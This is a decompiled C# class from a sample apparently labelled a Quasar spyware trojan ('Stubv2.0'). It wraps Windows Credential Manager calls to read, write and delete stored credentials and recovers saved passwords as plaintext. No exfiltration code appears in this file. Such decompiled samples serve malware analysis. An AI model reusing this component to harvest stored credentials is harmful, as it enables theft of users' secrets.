// Decompiled with JetBrains decompiler
// Type: NoiseMe.Drags.App.Models.CredentialManagement.Credential
// Assembly: Stubv2.0, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E945C042-2241-44AF-B826-4AD3FC72B170
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan-Spy.MSIL.Quasar.gen-a3f98ee0a78f039e0a9ea52dba13c713dc46f749512bd7d108cc9c05f57fc93d.exe

using System;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.Permissions;
using System.Text;

namespace NoiseMe.Drags.App.Models.CredentialManagement
{
  public class Credential : IDisposable
  {
    private static object _lockObject = new object();
    private bool _disposed;
    private static SecurityPermission _unmanagedCodePermission;
    private CredentialType _type;
    private string _target;
    private SecureString _password;
    private string _username;
    private string _description;
    private DateTime _lastWriteTime;
    private PersistanceType _persistanceType;

    static Credential()
    {
      lock (Credential._lockObject)
        Credential._unmanagedCodePermission = new SecurityPermission(SecurityPermissionFlag.UnmanagedCode);
    }

    public Credential()
      : this((string) null)
    {
    }

    public Credential(string username)
      : this(username, (string) null)
    {
    }

    public Credential(string username, string password)
      : this(username, password, (string) null)
    {
    }

    public Credential(string username, string password, string target)
      : this(username, password, target, CredentialType.Generic)
    {
    }

    public Credential(string username, string password, string target, CredentialType type)
    {
      this.Username = username;
      this.Password = password;
      this.Target = target;
      this.Type = type;
      this.PersistanceType = PersistanceType.Session;
      this._lastWriteTime = DateTime.MinValue;
    }

    public void Dispose()
    {
      this.Dispose(true);
      GC.SuppressFinalize((object) this);
    }

    ~Credential() => this.Dispose(false);

    private void Dispose(bool disposing)
    {
      if (!this._disposed && disposing)
      {
        this.SecurePassword.Clear();
        this.SecurePassword.Dispose();
      }
      this._disposed = true;
    }

    private void CheckNotDisposed()
    {
      if (this._disposed)
        throw new ObjectDisposedException("Credential object is already disposed.");
    }

    public string Username
    {
      get
      {
        this.CheckNotDisposed();
        return this._username;
      }
      set
      {
        this.CheckNotDisposed();
        this._username = value;
      }
    }

    public string Password
    {
      get => SecureStringHelper.CreateString(this.SecurePassword);
      set
      {
        this.CheckNotDisposed();
        this.SecurePassword = SecureStringHelper.CreateSecureString(string.IsNullOrEmpty(value) ? string.Empty : value);
      }
    }

    public SecureString SecurePassword
    {
      get
      {
        this.CheckNotDisposed();
        Credential._unmanagedCodePermission.Demand();
        return this._password != null ? this._password.Copy() : new SecureString();
      }
      set
      {
        this.CheckNotDisposed();
        if (this._password != null)
        {
          this._password.Clear();
          this._password.Dispose();
        }
        this._password = value == null ? new SecureString() : value.Copy();
      }
    }

    public string Target
    {
      get
      {
        this.CheckNotDisposed();
        return this._target;
      }
      set
      {
        this.CheckNotDisposed();
        this._target = value;
      }
    }

    public string Description
    {
      get
      {
        this.CheckNotDisposed();
        return this._description;
      }
      set
      {
        this.CheckNotDisposed();
        this._description = value;
      }
    }

    public DateTime LastWriteTime => this.LastWriteTimeUtc.ToLocalTime();

    public DateTime LastWriteTimeUtc
    {
      get
      {
        this.CheckNotDisposed();
        return this._lastWriteTime;
      }
      private set => this._lastWriteTime = value;
    }

    public CredentialType Type
    {
      get
      {
        this.CheckNotDisposed();
        return this._type;
      }
      set
      {
        this.CheckNotDisposed();
        this._type = value;
      }
    }

    public PersistanceType PersistanceType
    {
      get
      {
        this.CheckNotDisposed();
        return this._persistanceType;
      }
      set
      {
        this.CheckNotDisposed();
        this._persistanceType = value;
      }
    }

    public bool Save()
    {
      this.CheckNotDisposed();
      Credential._unmanagedCodePermission.Demand();
      byte[] bytes = Encoding.Unicode.GetBytes(this.Password);
      if (this.Password.Length > 512)
        throw new ArgumentOutOfRangeException("The password has exceeded 512 bytes.");
      if (!NativeMethods.CredWrite(ref new NativeMethods.CREDENTIAL()
      {
        TargetName = this.Target,
        UserName = this.Username,
        CredentialBlob = Marshal.StringToCoTaskMemUni(this.Password),
        CredentialBlobSize = bytes.Length,
        Comment = this.Description,
        Type = (int) this.Type,
        Persist = (int) this.PersistanceType
      }, 0U))
        return false;
      this.LastWriteTimeUtc = DateTime.UtcNow;
      return true;
    }

    public bool Delete()
    {
      this.CheckNotDisposed();
      Credential._unmanagedCodePermission.Demand();
      return !string.IsNullOrEmpty(this.Target) ? NativeMethods.CredDelete(string.IsNullOrEmpty(this.Target) ? new StringBuilder() : new StringBuilder(this.Target), this.Type, 0) : throw new InvalidOperationException("Target must be specified to delete a credential.");
    }

    public bool Load()
    {
      this.CheckNotDisposed();
      Credential._unmanagedCodePermission.Demand();
      IntPtr CredentialPtr;
      if (!NativeMethods.CredRead(this.Target, this.Type, 0, out CredentialPtr))
        return false;
      using (NativeMethods.CriticalCredentialHandle credentialHandle = new NativeMethods.CriticalCredentialHandle(CredentialPtr))
        this.Loadpublic(credentialHandle.GetCredential());
      return true;
    }

    public bool Exists()
    {
      this.CheckNotDisposed();
      Credential._unmanagedCodePermission.Demand();
      if (string.IsNullOrEmpty(this.Target))
        throw new InvalidOperationException("Target must be specified to check existance of a credential.");
      using (Credential credential = new Credential()
      {
        Target = this.Target,
        Type = this.Type
      })
        return credential.Load();
    }

    public void Loadpublic(NativeMethods.CREDENTIAL credential)
    {
      this.Username = credential.UserName;
      if (credential.CredentialBlobSize > 0)
        this.Password = Marshal.PtrToStringUni(credential.CredentialBlob, credential.CredentialBlobSize / 2);
      this.Target = credential.TargetName;
      this.Type = (CredentialType) credential.Type;
      this.PersistanceType = (PersistanceType) credential.Persist;
      this.Description = credential.Comment;
      this.LastWriteTimeUtc = DateTime.FromFileTimeUtc(credential.LastWritten);
    }
  }
}
